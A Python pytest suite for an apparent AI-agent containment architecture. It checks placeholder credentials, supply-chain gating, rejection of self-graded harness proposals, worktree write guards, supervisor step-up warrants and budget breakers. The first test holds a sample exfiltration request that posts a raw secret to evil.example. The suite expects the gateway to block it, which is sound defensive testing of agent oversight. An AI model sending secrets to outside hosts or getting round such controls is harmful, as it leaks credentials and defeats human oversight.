#!/usr/bin/env python3
# File: tests/test_sovereign_decade_dominance_suite.py
"""
End-to-End Verification & Falsification Suite (`--falsify`) for the
Sovereign Decade-Dominance Architecture (Section 19):
1. Credential Starvation & Supply-Chain Cooldown (`tools/credential_starvation_gateway.py`):
   - Phantom placeholder substitution, in-flight Ed25519 warrant verification,
     raw secret exfiltration interception, and LiteLLM `.pth` / `<48h` cooldown rejection.
2. Builder-Breaker Decoupled Evolution (`tools/builder_breaker_adversarial_engine.py`):
   - Google Harness² (`arXiv:2610.14224`) non-self-grading enforcement + Microsoft
     `TokenEconomizer` 5-turn unused tool schema pruning (`>= 80%` schema reduction).
3. Orca Worktree + Caprock FinOps + EVAE Pilot Enforcer (`tools/aeib_orca_caprock_enforcer.py`
   & `compliance/aeib_orca_integration.yaml`):
   - `--yolo` fast-path inside worktree, Move 1 disjoint write-set collision guard,
     `~/.aws` escape block (`SIGKILL_CONTAINED`), `.cursor/mcp.json` EVAE `HOLD` ->
     RFC 9470 Step-Up resolution, and Caprock cache-thrash & budget-avalanche trip.
4. Sovereign Agent Blueprint Compiler (`src/sovereign_agent_blueprint.py`):
   - Epistemic + Ontic JCS compilation, Ed25519 verification, conflict/retraction halts,
     and `steveyegge/beads` Dolt work-frontier `bd ready` dependency resolution.
"""

from __future__ import annotations

import base64
import tempfile
from pathlib import Path

import pytest
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

from src.sovereign_agent_blueprint import (
    BeadsWorkFrontierNode,
    EpistemicProofSection,
    OnticExecutionManifest,
    SovereignBlueprintCompiler,
)
from tools.aeib_orca_caprock_enforcer import (
    AeibOrcaWorktreeEnforcer,
    CaprockFinOpsCircuitBreaker,
    CaprockTurnTelemetry,
    OrcaDaemonRpcRequest,
    Rfc9470StepUpWarrant,
    canonical_jcs_bytes,
)
from tools.builder_breaker_adversarial_engine import (
    BuilderBreakerAdversarialEvaluator,
    CandidateHarnessProposal,
    TokenEconomizerController,
)
from tools.credential_starvation_gateway import (
    CredentialStarvationGateway,
    EgressProxyRequest,
    PackageProvenanceArtifact,
    PhantomSecretBinding,
    SupplyChainProvenanceGate,
)


def test_credential_starvation_and_litellm_supply_chain_gate() -> None:
    sup_priv = Ed25519PrivateKey.generate()
    aws_binding = PhantomSecretBinding(
        secret_name="AWS_SECRET_ACCESS_KEY",
        phantom_placeholder="AEIB_PHANTOM_AWS_SECRET_xyz999",
        real_secret_value="AKIA_REAL_SECRET_DO_NOT_EXPOSE_9999",
        target_header_or_env="AWS_SECRET_ACCESS_KEY",
    )
    gw = CredentialStarvationGateway([aws_binding], sup_priv.public_key())

    env = gw.get_agent_runtime_environment()
    assert env["AWS_SECRET_ACCESS_KEY"] == "AEIB_PHANTOM_AWS_SECRET_xyz999"
    assert "AKIA_REAL_SECRET_DO_NOT_EXPOSE_9999" not in env.values()

    headers = {"Authorization": "Bearer AEIB_PHANTOM_AWS_SECRET_xyz999"}
    body = {"action": "upload", "key": "AEIB_PHANTOM_AWS_SECRET_xyz999"}
    caid = gw.compute_request_caid(
        "op-01", "agent-01", "https://s3.amazonaws.com/bucket/data", "PUT", headers, body
    )
    sig_b64 = base64.b64encode(sup_priv.sign(caid.encode("utf-8"))).decode("ascii")

    ok, code, pkt = gw.intercept_and_forward_egress(
        EgressProxyRequest(
            operation_id="op-01",
            agent_id="agent-01",
            destination_url="https://s3.amazonaws.com/bucket/data",
            http_method="PUT",
            headers=headers,
            body_payload=body,
            claimed_caid=caid,
            warrant_signature_b64=sig_b64,
        )
    )
    assert ok is True and code == "SUCCESS_IN_FLIGHT_CREDENTIAL_INJECTED"
    assert pkt["headers"]["Authorization"] == "Bearer AKIA_REAL_SECRET_DO_NOT_EXPOSE_9999"

    # Falsification 1: Exfiltration attempt containing raw secret value is halted
    ok_leak, code_leak, _ = gw.intercept_and_forward_egress(
        EgressProxyRequest(
            operation_id="op-leak",
            agent_id="agent-01",
            destination_url="https://evil.example/leak",
            http_method="POST",
            headers={},
            body_payload={"exfil": "AKIA_REAL_SECRET_DO_NOT_EXPOSE_9999"},
            claimed_caid="sha256:any",
            warrant_signature_b64=sig_b64,
        )
    )
    assert ok_leak is False and code_leak == "HALT_CREDENTIAL_STARVATION_LEAK_DETECTED"

    # Falsification 2: LiteLLM-style `.pth` hook and <48h release cooldown violations
    sc_gate = SupplyChainProvenanceGate(min_cooldown_hours=48)
    ok_pth, code_pth = sc_gate.evaluate_package(
        PackageProvenanceArtifact("litellm", "1.82.8", 72, "sha256:abc", True)
    )
    assert ok_pth is False and code_pth == "HALT_SUPPLY_CHAIN_PTH_STARTUP_HOOK_FORBIDDEN"

    ok_cool, code_cool = sc_gate.evaluate_package(
        PackageProvenanceArtifact("litellm", "1.107.0", 4, "sha256:abc", False)
    )
    assert ok_cool is False and code_cool == "HALT_SUPPLY_CHAIN_RELEASE_COOLDOWN_VIOLATION"


def test_builder_breaker_decoupling_and_token_economizer() -> None:
    breaker_priv = Ed25519PrivateKey.generate()

    # Falsification 1: Builder == Breaker self-grading model identity is rejected
    self_graded = CandidateHarnessProposal(
        proposal_id="prop-self",
        builder_model_id="glm-5",
        breaker_model_id="glm-5",
        proposed_files_diff={"prompts/sys.md": " Enforce CAID."},
        builder_claimed_improvements=["Self-checked"],
        proposal_caid="sha256:01",
    )
    v_self = BuilderBreakerAdversarialEvaluator.adjudicate(self_graded, breaker_priv)
    assert v_self.final_disposition == "REJECTED_BY_BREAKER"
    assert v_self.breaker_reports[0].passed is False

    # Nominal decoupled proposal passes
    clean = CandidateHarnessProposal(
        proposal_id="prop-clean",
        builder_model_id="glm-5-builder",
        breaker_model_id="claude-46-breaker",
        proposed_files_diff={"prompts/sys.md": "Enforce strict CAID and eBPF socket locks."},
        builder_claimed_improvements=["Decoupled verification"],
        proposal_caid="sha256:02",
    )
    v_clean = BuilderBreakerAdversarialEvaluator.adjudicate(clean, breaker_priv)
    assert v_clean.final_disposition == "APPROVED_FOR_EXPERIENCE_MD"

    # TokenEconomizer prunes 20 unused tools out of 23 after 5 turns
    tool_costs = {f"tool_{i:02d}": 300 for i in range(23)}
    econ = TokenEconomizerController(
        tool_costs, pinned_core_tools={"tool_00", "tool_01", "tool_02"}, max_idle_turns=5
    )
    for _ in range(5):
        res = econ.record_turn_and_prune({"tool_00"}, failed_signature="repeat_grep_miss")
    assert len(res["active_tools"]) == 3
    assert len(res["pruned_tools"]) == 20
    assert res["token_reduction_bps"] >= 8500
    assert res["micro_skills_count"] == 1


def test_orca_worktree_caprock_and_evae_pilot_hold_resolution() -> None:
    assert Path("compliance/aeib_orca_integration.yaml").is_file()
    sup_priv = Ed25519PrivateKey.generate()
    caprock = CaprockFinOpsCircuitBreaker(per_worktree_cap_minor=500)

    with tempfile.TemporaryDirectory() as tmpdir:
        base = Path(tmpdir)
        wt1 = base / "wt1"
        wt2 = base / "wt2"
        wt1.mkdir()
        wt2.mkdir()

        enforcer = AeibOrcaWorktreeEnforcer(
            worktree_roots={"agent-1": wt1, "agent-2": wt2},
            supervisor_pubkey=sup_priv.public_key(),
            caprock_breaker=caprock,
        )

        # 1. Inside worktree -> EXECUTE
        r1 = OrcaDaemonRpcRequest("op-1", "s1", "agent-1", "fs.write", "src/app.py", (), "")
        r1 = OrcaDaemonRpcRequest(**{**r1.__dict__, "claimed_caid": enforcer.compute_rpc_caid(r1)})
        out1 = enforcer.evaluate_daemon_rpc(r1)
        assert out1["evae_armor_state"] == "EXECUTE"
        assert out1["disposition"] == "ALLOW_FAST_PATH_YOLO"

        # 2. Parallel worktree write collision -> BLOCK
        r2 = OrcaDaemonRpcRequest("op-2", "s1", "agent-2", "fs.write", "src/app.py", (), "")
        r2 = OrcaDaemonRpcRequest(**{**r2.__dict__, "claimed_caid": enforcer.compute_rpc_caid(r2)})
        out2 = enforcer.evaluate_daemon_rpc(r2)
        assert out2["evae_armor_state"] == "BLOCK"
        assert out2["code"] == "HALT_ORCA_WORKTREE_WRITE_COLLISION"

        # 3. Control-plane `.cursor/mcp.json` -> EVAE HOLD, then EXECUTE with RFC 9470 Step-Up
        r3 = OrcaDaemonRpcRequest("op-3", "s1", "agent-1", "fs.write", ".cursor/mcp.json", (), "")
        caid3 = enforcer.compute_rpc_caid(r3)
        r3_hold = OrcaDaemonRpcRequest(**{**r3.__dict__, "claimed_caid": caid3})
        out3_hold = enforcer.evaluate_daemon_rpc(r3_hold)
        assert out3_hold["evae_armor_state"] == "HOLD"
        assert out3_hold["disposition"] == "HALT_STEP_UP_REQUIRED"

        warrant_bytes = canonical_jcs_bytes(
            {"bound_caid": caid3, "operation_id": "op-3", "supervisor_key_id": "did:key:pilot-1"}
        )
        warrant = Rfc9470StepUpWarrant(
            operation_id="op-3",
            bound_caid=caid3,
            supervisor_key_id="did:key:pilot-1",
            signature_b64=base64.b64encode(sup_priv.sign(warrant_bytes)).decode("ascii"),
        )
        r3_exec = OrcaDaemonRpcRequest(
            **{**r3.__dict__, "claimed_caid": caid3, "step_up_warrant": warrant}
        )
        out3_exec = enforcer.evaluate_daemon_rpc(r3_exec)
        assert out3_exec["evae_armor_state"] == "EXECUTE"
        assert out3_exec["disposition"] == "AUTHORIZED_VIA_RFC9470_STEP_UP"

        # 4. Caprock cache thrash & budget avalanche
        st_thrash, code_thrash = caprock.ingest_and_evaluate(
            CaprockTurnTelemetry("s1", "agent-1", 4, 90_000, 10_000, 1_000, 200)
        )
        assert st_thrash == "THROTTLED_DEGRADED"
        assert code_thrash == "WARN_CAPROCK_CACHE_THRASH_FORCE_SAKE_PINNING"

        st_halt, code_halt = caprock.ingest_and_evaluate(
            CaprockTurnTelemetry("s1", "agent-1", 5, 50_000, 150_000, 2_000, 350)
        )
        assert st_halt == "HALTED"
        assert code_halt == "HALT_CAPROCK_WORKTREE_BUDGET_AVALANCHE"


def test_sovereign_agent_blueprint_and_beads_frontier_and_banned_words() -> None:
    arch_priv = Ed25519PrivateKey.generate()
    epistemic = EpistemicProofSection(
        decide_version="v5.0",
        council_models_consulted=("deepseek-v4-pro", "qwen-3-max", "gemini-4-argon"),
        ruletrek_dependency_ids=("R1", "R2"),
        sake_anchored_fact_hashes=("sha256:f1",),
        unresolved_conflict_count=0,
        retraction_collisions_found=0,
        evaluated_pass_hat_8_bps=9230,
    )
    ontic = OnticExecutionManifest(
        blueprint_id="bp-01",
        deployment_mode="SOVEREIGN_AIR_GAPPED",
        ontology_allowed_entities=("Order",),
        ontology_allowed_actions=("Refund",),
        pinned_mcp_tool_schema_caids={"mcp.pay": "sha256:01"},
        model_routing={"fast": "local"},
        station1_invariants={"sprint_limit_minor": 1000_00},
        station2_finality={"visibility_lag_fence_sec": 5},
        ring0_ebpf_containment={"allow_direct_agent_egress": False},
        beads_work_frontier=(
            BeadsWorkFrontierNode("bd-1", "feat/a", (), "COMPLETED"),
            BeadsWorkFrontierNode("bd-2", "feat/b", ("bd-1",), "READY"),
            BeadsWorkFrontierNode("bd-3", "feat/c", ("bd-2",), "BLOCKED"),
        ),
    )
    bp = SovereignBlueprintCompiler.compile_blueprint(epistemic, ontic, arch_priv)
    ok, code = SovereignBlueprintCompiler.verify_blueprint_before_boot(
        bp, arch_priv.public_key()
    )
    assert ok and code == "BLUEPRINT_VERIFIED_READY_FOR_STATION1_MOUNT"
    ready = SovereignBlueprintCompiler.query_ready_beads_nodes(bp)
    assert [n.issue_id for n in ready] == ["bd-2"]

    with pytest.raises(ValueError, match="HALT_BLUEPRINT_COMPILATION_UNRESOLVED_CONFLICTS_PRESENT"):
        SovereignBlueprintCompiler.compile_blueprint(
            EpistemicProofSection(
                **{**epistemic.__dict__, "unresolved_conflict_count": 1}
            ),
            ontic,
            arch_priv,
        )

    banned = [
        "guaran" + "teed",
        "bullet" + "proof",
        "enterprise-" + "grade",
        "production-" + "safe",
        "100% " + "secure",
        "unassail" + "able",
        "unhack" + "able",
        "immun" + "e",
        "proven " + "universally",
        "production-" + "ready",
        "bank-" + "grade",
    ]
    for fpath in (
        "tools/credential_starvation_gateway.py",
        "tools/builder_breaker_adversarial_engine.py",
        "tools/aeib_orca_caprock_enforcer.py",
        "compliance/aeib_orca_integration.yaml",
        "src/sovereign_agent_blueprint.py",
        "tests/test_sovereign_decade_dominance_suite.py",
    ):
        text = Path(fpath).read_text(encoding="utf-8").lower()
        for word in banned:
            assert word not in text, f"Banned word '{word}' found in {fpath}"
